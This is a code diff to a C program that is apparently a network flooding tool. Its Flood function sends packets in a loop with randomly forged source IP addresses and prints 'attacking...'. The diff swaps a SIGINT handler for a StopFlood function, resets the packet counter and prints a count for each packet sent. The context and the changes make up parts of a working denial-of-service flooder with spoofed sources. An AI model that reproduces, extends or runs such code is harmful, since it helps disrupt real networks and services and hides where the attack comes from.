@@ -31,11 +31,10 @@ int ValidIP(char* ip)
     return inet_pton(AF_INET, ip, &(socketAddressInput.sin_addr)) != 0;
 }
 
-void InterruptHandler(int signal)
+void StopFlood()
 {
-    isSending = false;
     printf("\n%d [DATA] packets sent\n", packetCount);
-    exit(0);
+    isSending = false;
 }
 
 uint16_t Checksum(uint16_t* pointer, int numBytes) 
@@ -71,7 +70,6 @@ void Flood(void* destinationIPvoid)
     int option          = 0;
 
     srand(time(0));                
-    signal(SIGINT, InterruptHandler);
 
     printf("[DATA: %s] Flood is starting...\n", destinationIP);
 
@@ -129,6 +127,9 @@ void Flood(void* destinationIPvoid)
 
     printf("[DATA: %s@%d] attacking...\n", destinationIP, destinationPort);
 
+    isSending = true;
+    packetCount = 0;
+
     while (isSending) 
     {
         ipHeader->saddr = inet_addr(RandomIP());
@@ -148,6 +149,7 @@ void Flood(void* destinationIPvoid)
             printf("\n[ERR: %s] Program terminated\n", destinationIP);
             exit(0);
         } else packetCount++;
+        printf("%d\n", packetCount);
     }
 
     close(socketFD);
